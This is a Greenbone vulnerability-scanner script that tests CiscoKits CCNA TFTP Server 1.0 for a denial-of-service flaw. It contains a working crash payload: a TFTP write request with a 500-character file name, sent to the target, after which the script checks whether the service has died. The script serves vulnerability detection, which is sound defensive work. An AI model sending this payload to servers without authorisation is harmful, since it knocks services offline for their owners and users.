# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802232");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2011-08-10 13:49:51 +0200 (Wed, 10 Aug 2011)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_name("CiscoKits CCNA TFTP Server 'Write' Command Denial Of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("tftpd_detect.nasl", "os_detection.nasl");
  script_require_udp_ports("Services/udp/tftp", 69);
  script_mandatory_keys("tftp/detected");
  script_require_keys("Host/runs_windows");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/69042");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49045");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17618/");
  script_xref(name:"URL", value:"http://secpod.org/SECPOD_CiscoKits_CCNA_TFTP_DoS_POC.py");
  script_xref(name:"URL", value:"http://secpod.org/advisories/SECPOD_Ciscokits_CCNA_TFTP_DoS.txt");

  script_tag(name:"impact", value:"Successful exploitation could allow an attacker to cause denial
  of service condition.");

  script_tag(name:"affected", value:"CiscoKits CCNA TFTP Server 1.0.");

  script_tag(name:"insight", value:"The flaw is due to improper validation of 'WRITE' request
  parameter containing a long file name, which allows remote attackers to crash the service and
  cause denial of service condition.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Ciscokits CCNA TFTP Server is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("misc_func.inc");
include("port_service_func.inc");

port = service_get_port(default:69, proto:"tftp", ipproto:"udp");

soc = open_sock_udp(port);
if(!soc)
  exit(0);

mode = "netascii";

req = raw_string(0x00, 0x01) +       ## Read Request
      "AAA.txt" + raw_string(0x00) + ## Source File Name
      mode + raw_string(0x00);       ## Type (Mode)

send(socket:soc, data:req);
res = recv(socket:soc, length:100);

if(!res || "Not Found in local Storage" >!< res){
  close(soc);
  exit(0);
}

attack = raw_string(0x00, 0x02) +                        ## Write Request
         crap(data:"A", length:500) + raw_string(0x00) + ## Source File Name
         mode + raw_string(0x00);                        ## Type (Mode)

send(socket:soc, data:attack);
close(soc);

sleep(5);

soc1 = open_sock_udp(port);
if(!soc1){
  security_message(port:port, proto:"udp");
  exit(0);
}

send(socket:soc1, data:req);
res = recv(socket:soc1, length:100);

if(!res || "Not Found in local Storage" >!< res) {
  security_message(port:port, proto:"udp");
  exit(0);
}

close(soc1);
exit(99);
